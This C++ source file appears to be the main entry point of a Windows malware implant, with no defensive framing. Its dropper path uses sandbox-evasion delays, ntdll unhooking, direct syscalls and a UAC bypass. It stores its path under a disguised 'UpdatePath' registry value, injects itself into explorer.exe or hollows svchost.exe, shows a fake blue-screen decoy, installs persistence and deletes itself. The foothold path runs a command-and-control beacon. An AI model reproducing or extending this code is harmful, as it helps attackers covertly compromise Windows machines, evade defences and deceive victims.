#include "beacon/Beacon.h"
#include "persistence/Persistence.h"
#include "evasion/Unhooker.h"
#include "evasion/Syscalls.h"
#include "evasion/Injector.h"
#include "evasion/UACBypass.h"
#include "evasion/Detection.h"
#include "decoy/BSOD.h"
#include "utils/SelfDelete.h"
#include "utils/Logger.h"
#include "utils/Shared.h"
#include <windows.h>
#include <objbase.h>
#include <vector>
#include <algorithm>
#include <cwctype>

namespace {
    std::vector<uint8_t> GetSelfImage() {
        wchar_t path[MAX_PATH];
        GetModuleFileNameW(NULL, path, MAX_PATH);
        HANDLE hFile = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        if (hFile == INVALID_HANDLE_VALUE) return {};
        DWORD size = GetFileSize(hFile, NULL);
        std::vector<uint8_t> buffer(size);
        DWORD read;
        ReadFile(hFile, buffer.data(), size, &read, NULL);
        CloseHandle(hFile);
        return buffer;
    }

    bool IsSystemProcess() {
        wchar_t path[MAX_PATH];
        GetModuleFileNameW(NULL, path, MAX_PATH);
        std::wstring sPath(path);
        std::transform(sPath.begin(), sPath.end(), sPath.begin(), [](wchar_t c) { return (wchar_t)std::towlower(c); });
        return (sPath.find(L"explorer.exe") != std::wstring::npos || sPath.find(L"svchost.exe") != std::wstring::npos);
    }
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
    (void)hInstance; (void)hPrevInstance; (void)lpCmdLine; (void)nShowCmd;

    // Initial delay to bypass some sandbox/behavioral analysis
    Sleep(10000 + (GetTickCount() % 20000));

    evasion::Unhooker::RefreshNtdll();
    evasion::SyscallResolver::GetInstance();

    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr)) return 1;

    if (IsSystemProcess()) {
        // Foothold instance
        LOG_INFO("Foothold running.");

        // Wait a bit before installing persistence
        Sleep(30000 + (GetTickCount() % 60000));

        std::wstring dropperPath = L"";
        HKEY hKey;
        if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            wchar_t buf[MAX_PATH];
            DWORD sz = sizeof(buf);
            if (RegQueryValueExW(hKey, L"UpdatePath", NULL, NULL, (LPBYTE)buf, &sz) == ERROR_SUCCESS) {
                dropperPath = buf;
            }
            RegCloseKey(hKey);
        }

        if (!dropperPath.empty()) {
            persistence::establishPersistence(dropperPath);
        }

        beacon::Beacon implant;
        implant.run();

        CoUninitialize();
        return 0;
    }

    // Dropper instance
    LOG_INFO("Dropper started.");

    if (!utils::IsAdmin()) {
        if (evasion::UACBypass::Execute(GetCommandLineW())) {
            CoUninitialize();
            return 0;
        }
    }

    // More delay before injection
    Sleep(15000 + (GetTickCount() % 30000));

    wchar_t selfPath[MAX_PATH];
    GetModuleFileNameW(NULL, selfPath, MAX_PATH);
    HKEY hKey;
    if (RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows", 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, L"UpdatePath", 0, REG_SZ, (LPBYTE)selfPath, (DWORD)(wcslen(selfPath) + 1) * sizeof(wchar_t));
        RegCloseKey(hKey);
    }

    std::vector<uint8_t> selfImage = GetSelfImage();
    if (!selfImage.empty()) {
        if (evasion::Injector::InjectIntoExplorer(selfImage)) {
            decoy::ShowBSOD();
            CoUninitialize();
            utils::SelfDeleteAndExit();
            return 0;
        } else {
            Sleep(10000);
            wchar_t systemPath[MAX_PATH];
            GetSystemDirectoryW(systemPath, MAX_PATH);
            std::wstring svchost = std::wstring(systemPath) + L"\\svchost.exe";
            if (evasion::Injector::HollowProcess(svchost, selfImage)) {
                decoy::ShowBSOD();
                CoUninitialize();
                utils::SelfDeleteAndExit();
                return 0;
            }
        }
    }

    persistence::establishPersistence();
    decoy::ShowBSOD();
    CoUninitialize();
    utils::SelfDeleteAndExit();

    return 0;
}
